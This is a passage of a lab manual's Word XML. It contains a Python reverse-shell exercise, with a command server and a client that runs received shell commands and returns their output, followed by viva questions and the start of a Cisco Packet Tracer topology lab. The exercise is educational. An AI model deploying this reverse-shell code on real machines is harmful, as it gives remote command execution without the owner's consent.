    <w:p w14:paraId="3D456B51" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>conn.send(command.encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B32D97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response = conn.recv(4096).decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CE9329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print(response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F0645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except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C45116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print(f"[!] Error: {e}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BA5D8F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>conn.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A4246C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C160540" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D41CB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start_server():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5DDE90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server = create_server_socket()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B30047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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C2928DF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>conn, addr = server.accept()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7211B75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client_thread = threading.Thread(target=handle_client, args=(conn,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB39DFC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>addr))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C09F7F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>client_thread.start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B38189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if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="627D39AA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>start_server()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791A17E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79130CDE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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE1A3B2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subprocess</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D51D806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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D961D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host = '127.0.0.1'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698AE166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port = 9999</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF5E8B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def connect_to_server():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EE569A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client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7D37C6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>client.connect((host, port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D17B01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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A688133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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66313EF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command = client.recv(1024).decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4987D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if command.lower() == 'quit':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41ECEB1E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3904B797" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>elif command.startswith('cd '):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0503DF98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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A5857E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>os.chdir(command[3:].strip())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FED9E2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 = f"Changed directory to {os.getcwd()}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F9AC44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except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5260A0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 = str(e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F51D59C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="717C8255" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A0EDB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process = subprocess.Popen(command, shell=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48CC627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stdout=subprocess.PIPE, stderr=subprocess.PIPE,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EA5907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stdin=subprocess.PIPE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30664DAA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 = process.stdout.read() + process.stderr.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBE50B7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 = output.decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232B742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current_dir = os.getcwd() + "&gt; "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="551365FD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>client.send((output + "\n" + current_dir).encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643C7DB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except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB0ABE6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>client.send(str(e).encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BF9A81" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C971BC2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>client.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C10B399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if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C6D16C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>connect_to_server()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715CD1BB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9617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96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87)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10E6E74D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Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05442BE6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2354CF8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Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A93D24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029B472D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus a program was developed and executed to reverse shell using TCP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A064C90" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB3E12A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D20995" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Viva Questions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C68699" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is a TCP socket?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2683E1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C9E48F2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A TCP socket is an endpoint used for reliable, connection-oriented</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F614F91" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>communication between two devices over a network using the TCP protocol.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03365DD9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is a reverse shell?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57BAFE29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3BB54ACE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A reverse shell is a program in which a client system initiates a connection to a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35039E7F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>server, allowing remote command execution. It should be used only in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E449EC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>authorized lab environments for educational purposes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF4D021" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Which Python module is used for TCP socket programming?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E16351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11AC18C2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The socket module is used in Python to create and manage TCP sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123E8765" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DCFB05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import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F96B3AD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. What is the difference between a client and a server in socket programming?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6377CAEA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5B04F66" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A server waits for incoming connections, while a client initiates a connection to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E2AE1B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3E2889" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Why is TCP preferred for remote communication applications?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A5EABC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752AF567" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP provides reliable, ordered, and error-checked delivery of data, ensuring</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1558B9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>that information reaches the destination correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F95EB1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB26997" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D89B605" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESIGN A SIMPLE TOPOLOGY USING CISCO PACKET TRACER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2718DACC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7F8E9D0C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To design and configure a simple network topology with one router, two</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2BC681" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>switches, and four PCs in Cisco Packet Tracer for successful inter-network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336B00FB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>communication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1166EA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Procedure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A5EEA8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Launch Cisco Packet Tracer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C1801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F5BE31F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Open Cisco Packet Tracer on your system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33250443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E215CAD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Ensure the workspace and device categories (Routers, Switches, End</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50ED269F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Devices, etc.) are visible.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34EF906F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Add Network Devices</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6584B0A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E7A4865" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>From the Routers section, drag one router onto the workspace.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24380DFB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57D0E02" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>From the Switches section, drag two 2960 switches.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798F229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32DE53A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>From the End Devices section, drag four PCs (PC1, PC2, PC3, PC4).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BF9FBD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C5FDBF2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Rename the devices.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6485ABED" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Connect the Devices</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77219B34" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Use Copper Straight-Through cables to connect:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4C209C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68BF125" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC1 to Switch1 using port FastEthernet0/1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41AEBE35" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C3BFB5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B9E7565" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC2 to Switch1 using port FastEthernet0/2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690A7A15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1FA6207" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC3 to Switch2 using port FastEthernet0/1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D8F7DB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4D585EE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC4 to Switch2 using port FastEthernet0/2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7FCFC2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8520637" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Switch1 to the router using Switch1 port GigabitEthernet0/1 and Router</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC5436B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>port GigabitEthernet0/0/0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B85F19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3252C42" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Switch2 to the router using Switch2 port GigabitEthernet0/1 and Router</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141FA237" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>port GigabitEthernet0/0/1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9EE156" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Assign IP Addresses:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1637736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85374CF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Network 1 (Switch1 side): 192.168.1.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B5181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26A23F8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Network 2 (Switch2 side): 192.168.2.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF28D01" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>For each PC (PC1 to PC4):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501823C6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Click the PC → go to Desktop → IP Configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4921368D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Select Static and manually enter the IP address, subnet mask, and default</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A368DFA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>gateway</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F15FA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BEE529D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC1 → IP 192.168.1.2 / 255.255.255.0, Gateway 192.168.1.1</w:t>
      </w:r>
    </w:p>
